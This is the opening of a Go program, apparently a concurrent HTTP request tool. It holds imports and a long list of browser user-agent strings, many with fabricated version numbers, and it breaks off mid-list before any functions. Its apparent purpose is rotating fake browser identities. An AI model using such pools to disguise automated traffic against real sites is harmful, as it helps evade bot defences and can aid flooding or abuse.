package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------- GLOBAL ----------------
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) Firefox/118.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
	"Mozilla/5.0 (Linux; Android 13) Chrome/116.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5112.191 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5593.165 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/691.5.43 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/691.5.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/670.1.37 (KHTML, like Gecko) Version/14.0 Safari/670.1.37",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/102.0.4335.156 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.5806.169 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/731.2.35 (KHTML, like Gecko) Version/17.0 Safari/731.2.35",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/853.2.30 (KHTML, like Gecko) Version/13.0 Safari/853.2.30",
    "Mozilla/5.0 (Linux; Android 12; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.5139.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.5122.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/108.0.4725.160 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/109.0.5417.178 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/772.4.1 (KHTML, like Gecko) Version/14.0 Safari/772.4.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/108.0.5945.136 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/120.0.4399.137 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/993.1.27 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/993.1.27",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/972.5.6 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/972.5.6",
    "Mozilla/5.0 (Linux; Android 10; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4747.175 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/929.1.45 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/929.1.45",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/768.2.12 (KHTML, like Gecko) Version/13.0 Safari/768.2.12",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/697.3.26 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/697.3.26",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/766.5.8 (KHTML, like Gecko) Version/17.0 Safari/766.5.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/747.2.3 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/747.2.3",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5764.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/120.0.4522.136 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.4743.172 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/937.4.17 (KHTML, like Gecko) Version/13.0 Safari/937.4.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/646.2.16 (KHTML, like Gecko) Version/14.0 Safari/646.2.16",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.5531.183 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/696.5.30 (KHTML, like Gecko) Version/16.0 Safari/696.5.30",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/113.0.4260.165 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4118.147 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/819.3.46 (KHTML, like Gecko) Version/16.0 Safari/819.3.46",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.5999.148 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/934.2.10 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/934.2.10",
    "Mozilla/5.0 (Linux; Android 10; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5122.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/769.3.17 (KHTML, like Gecko) Version/14.0 Safari/769.3.17",
    "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/684.2.38 (KHTML, like Gecko) Version/17.0 Safari/684.2.38",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.5063.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/758.3.41 (KHTML, like Gecko) Version/15.0 Safari/758.3.41",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/117.0.5054.194 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5069.132 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/690.1.46 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/690.1.46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/944.2.34 (KHTML, like Gecko) Version/14.0 Safari/944.2.34",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/996.2.24 (KHTML, like Gecko) Version/14.0 Safari/996.2.24",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/982.4.23 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/982.4.23",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/785.2.2 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/785.2.2",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/108.0.5759.126 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4275.152 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/785.3.19 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/785.3.19",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/668.3.14 (KHTML, like Gecko) Version/14.0 Safari/668.3.14",
    "Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/117.0.5687.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/109.0.4838.179 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/971.2.40 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/971.2.40",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.4182.146 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5976.103 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/610.1.19 (KHTML, like Gecko) Version/13.0 Safari/610.1.19",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/677.2.9 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/677.2.9",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/101.0.4004.163 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/921.2.30 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/921.2.30",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0.5637.166 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/708.4.16 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/708.4.16",
    "Mozilla/5.0 (Linux; Android 14; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4621.200 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/814.3.40 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/814.3.40",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/747.4.16 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/747.4.16",
    "Mozilla/5.0 (X11; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5205.151 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/899.2.44 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/899.2.44",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/111.0.4265.185 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/603.4.6 (KHTML, like Gecko) Version/13.0 Safari/603.4.6",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/930.4.46 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/930.4.46",
    "Mozilla/5.0 (Linux; Android 12; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4311.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/905.4.7 (KHTML, like Gecko) Version/14.0 Safari/905.4.7",
    "Mozilla/5.0 (X11; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/857.5.46 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/857.5.46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_9) AppleWebKit/644.3.32 (KHTML, like Gecko) Version/17.0 Safari/644.3.32",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/923.3.17 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/923.3.17",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/819.1.19 (KHTML, like Gecko) Version/16.0 Safari/819.1.19",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4821.168 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_9) AppleWebKit/797.5.13 (KHTML, like Gecko) Version/13.0 Safari/797.5.13",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/684.2.38 (KHTML, like Gecko) Version/15.0 Safari/684.2.38",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/620.4.27 (KHTML, like Gecko) Version/14.0 Safari/620.4.27",
    "Mozilla/5.0 (Linux; Android 15; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4522.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5007.100 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/653.3.24 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/653.3.24",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/999.3.21 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/999.3.21",
    "Mozilla/5.0 (Linux; Android 7; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5317.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/103.0.4767.158 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/107.0.5380.130 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/774.5.29 (KHTML, like Gecko) Version/14.0 Safari/774.5.29",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/668.2.43 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/668.2.43",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/118.0.4468.122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_8) AppleWebKit/736.3.22 (KHTML, like Gecko) Version/16.0 Safari/736.3.22",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.4007.130 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4351.143 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/933.3.22 (KHTML, like Gecko) Version/13.0 Safari/933.3.22",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/733.1.42 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/733.1.42",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/113.0.4892.139 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_9) AppleWebKit/836.2.47 (KHTML, like Gecko) Version/15.0 Safari/836.2.47",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.5642.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/978.2.3 (KHTML, like Gecko) Version/17.0 Safari/978.2.3",
    "Mozilla/5.0 (Linux; Android 10; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4656.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/914.2.43 (KHTML, like Gecko) Version/16.0 Safari/914.2.43",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.4780.200 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4664.126 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/607.4.13 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/607.4.13",
    "Mozilla/5.0 (Linux; Android 13; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4075.174 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4845.191 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/960.1.9 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/960.1.9",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.5598.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/105.0.4925.197 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/945.5.50 (KHTML, like Gecko) Version/13.0 Safari/945.5.50",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/795.4.10 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/795.4.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_8) AppleWebKit/683.5.21 (KHTML, like Gecko) Version/17.0 Safari/683.5.21",
    "Mozilla/5.0 (Linux; Android 11; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5250.183 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/986.5.26 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/986.5.26",
    "Mozilla/5.0 (Linux; Android 11; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.5443.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.5463.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/929.1.2 (KHTML, like Gecko) Version/17.0 Safari/929.1.2",
    "Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/832.4.38 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/832.4.38",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/637.4.3 (KHTML, like Gecko) Version/13.0 Safari/637.4.3",
    "Mozilla/5.0 (Linux; Android 13; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.5388.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/631.3.44 (KHTML, like Gecko) Version/15.0 Safari/631.3.44",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100.0.4203.121 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5145.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/115.0.4249.140 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4784.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/632.3.43 (KHTML, like Gecko) Version/13.0 Safari/632.3.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_8) AppleWebKit/606.1.7 (KHTML, like Gecko) Version/13.0 Safari/606.1.7",
    "Mozilla/5.0 (Linux; Android 10; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4113.101 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Linux; Android 14; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4114.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/929.2.38 (KHTML, like Gecko) Version/15.0 Safari/929.2.38",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/904.3.1 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/904.3.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.4015.169 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5474.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/987.2.47 (KHTML, like Gecko) Version/13.0 Safari/987.2.47",
    "Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/669.2.48 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/669.2.48",
    "Mozilla/5.0 (X11; Linux x86_64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/111.0.5592.109 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/104.0.5523.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/111.0.5549.147 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/935.5.29 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/935.5.29",
    "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/979.2.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/979.2.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/118.0.5092.118 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/908.1.23 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/908.1.23",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/740.4.11 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/740.4.11",
    "Mozilla/5.0 (Linux; Android 10; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.5940.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4185.162 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/695.1.16 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/695.1.16",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/706.4.15 (KHTML, like Gecko) Version/16.0 Safari/706.4.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_7) AppleWebKit/955.5.8 (KHTML, like Gecko) Version/16.0 Safari/955.5.8",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.4596.150 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.5533.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4430.167 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/866.5.1 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/866.5.1",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/109.0.4682.192 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/847.2.31 (KHTML, like Gecko) Version/15.0 Safari/847.2.31",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/100.0.5464.122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/663.4.15 (KHTML, like Gecko) Version/17.0 Safari/663.4.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/694.5.46 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/694.5.46",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/111.0.4942.176 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/987.2.4 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/987.2.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/774.1.7 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/774.1.7",
    "Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/108.0.4421.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/100.0.4397.182 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/840.1.20 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/840.1.20",
    "Mozilla/5.0 (Linux; Android 8; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5972.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/942.5.42 (KHTML, like Gecko) Version/17.0 Safari/942.5.42",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/747.2.33 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/747.2.33",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/832.2.30 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/832.2.30",
    "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/619.1.4 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/619.1.4",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/106.0.5315.128 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_7) AppleWebKit/680.3.14 (KHTML, like Gecko) Version/15.0 Safari/680.3.14",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/879.5.17 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/879.5.17",
